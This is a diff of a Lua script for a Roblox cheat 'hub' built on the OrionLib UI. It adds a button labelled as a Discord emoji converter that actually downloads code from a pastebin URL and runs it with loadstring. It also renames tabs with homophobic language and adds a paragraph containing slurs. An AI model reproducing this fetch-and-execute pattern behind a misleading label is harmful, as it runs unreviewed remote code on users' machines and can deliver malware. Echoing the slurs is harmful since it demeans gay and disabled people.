@@ -12,12 +12,20 @@ OrionLib:MakeNotification({
 })
 
 local Tab = Window:MakeTab({
-	Name = "lmao",
+	Name = "homosex",
 	Icon = "rbxassetid://4483345998",
 	PremiumOnly = false
 })
+
+Tab:AddButton({
+	Name = "discord emoji converter (:smile:)",
+	Callback = function()
+loadstring(game:HttpGet(('https://pastebin.com/raw/fS4gJxSm'),true))()
+  	end    
+})
+
 local Section = Tab:AddSection({
-	Name = "Section"
+	Name = "dumb shit vvvv"
 })
 Tab:AddParagraph("information about rogay hub","rogay hub is made using other people's scripts since i'm a retard who can only compile scripts btw butekel is my gay script kiddie :D")
 
